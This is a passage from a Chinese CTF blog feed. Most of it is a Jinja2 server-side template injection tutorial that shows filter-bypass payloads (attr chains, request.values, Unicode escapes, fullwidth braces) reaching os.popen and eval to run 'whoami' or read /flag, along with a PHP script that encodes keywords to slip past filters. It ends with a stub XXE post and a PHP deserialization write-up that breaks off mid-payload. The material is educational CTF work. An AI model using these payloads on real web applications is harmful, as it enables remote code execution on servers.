id="过滤args和-和">过滤<code>args</code>和<code>.</code>和<code>_</code></h4><p>之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了<code>attr()</code>绕过点，<code>values</code>绕过<code>args</code>，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="导入主函数读取变量">导入主函数读取变量</h4><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把<code>/flag</code>文件加载到flag这个变量里面了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = f.read()</span><br></pre></td></tr></table></figure><p>我们就可以通过<code>import</code>是导入<code>__main__</code>主函数去读变量，payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> request.application.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;__main__&#x27;</span>).flag %&#125;</span><br></pre></td></tr></table></figure><h4 id="Unicode绕过">Unicode绕过</h4><p>这种方法是从安洵杯2020 官方Writeup学到的，我们直奔主题看payload</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>print</code>绕过<code>&#123;&#123;&#125;&#125;</code>和<code>attr</code>绕过<code>.</code>上面已经说过了这里不赘述</p><p>然后这里的<code>lipsum</code>用<code>&#123;&#123;lipsum&#125;&#125;</code>测了一下发现是个方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;function generate_lorem_ipsum at <span class="number">0x7fcddfa296a8</span>&gt;</span><br></pre></td></tr></table></figure><p>然后用他直接调用<code>__globals__</code>发现可以直接执行os命令，测了一下发现<code>__builtins__</code>也可以用，又学到了一种新方法，只能说师傅们tql</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure><p>然后我这里顺便给个Unicode互转的php脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function unicode_encode($strLong) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  foreach ($strArr as $str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      foreach ($arr as $value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function unicode_decode($name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!empty($matches))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $name .= $c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $name .= $str;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function unicode_decode2($str)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (empty($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure><h4 id="魔改字符">魔改字符</h4><p>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改<code>&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法</p><p><img src="https://gitee.com/eviden/img/raw/master/202406141122014.png" alt="img"></p><p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8</span><br></pre></td></tr></table></figure><p>还可以使用中文的字符魔改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">｛ &amp;#<span class="number">65371</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">｝ &amp;#<span class="number">65373</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">［ &amp;#<span class="number">65339</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">］ &amp;#<span class="number">65341</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">＇ &amp;#<span class="number">65287</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">＂ &amp;#<span class="number">65282</span>;</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ </span><br></pre></td></tr></table></figure><h3 id="总结">总结</h3><p>因为水平和文章篇幅有限，可能还有一些bypass方法没有提到，还有就是CTF中也不只考Jinja2这种模板，还有另外的Twig模板，smart等模板，这些就等以后有必要再更吧，最后就是有不足之处请各位师傅指出</p><h3 id="参考链接">参考链接</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//p0sec.net/index.php/archives/120/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//www.jianshu.com/p/a736e39c3510</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//www.redmango.top/article/43</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//xz.aliyun.com/t/8029</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//xz.aliyun.com/t/7746</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简简单单入个门XXE</title>
      <link href="/posts/75281fd1.html"/>
      <url>/posts/75281fd1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>[<a href="https://www.nssctf.cn/problem/1256">NCTF 2019]Fake XML cookbook | NSSCTF</a></p></blockquote><p>开题是个登录页面,放到bp里看看包长啥样</p><p><img src="https://gitee.com/eviden/img/raw/master/image-20240612223847869.png" alt="image-20240612223847869"></p><p>emmm,这个xxe的特征很好辨认的吧!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日穿php反序列化</title>
      <link href="/posts/db1d0201.html"/>
      <url>/posts/db1d0201.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.nssctf.cn/problem/3095">UUCTF 2022 新生赛]ez_unser | NSSCTF</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">NSSCTF&#123;This_iS_SO_SO_SO_EASY&#125;</span><br></pre></td></tr></table></figure><p>讨人厌的waf<code>if(!preg_match('/test&quot;:3/i',$a))</code>,这里写死了反序列化后的成员数量,让你无法绕过wakeup()魔法,必定触发<code> $this-&gt;a='';</code>然后不能命令执行了.</p><p>这样我们选择一手<code>金蝉脱壳</code>运用引用赋值,将b和a的引用指向同一个地方,<code>这样也就能让b和a的值同时变化</code>,题中只对a的值做变化,而其引用b的地址没变,<code>进而通过控制c控制b的值然后a和b一个引用</code>,因此仍然是可以命令执行的.</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span 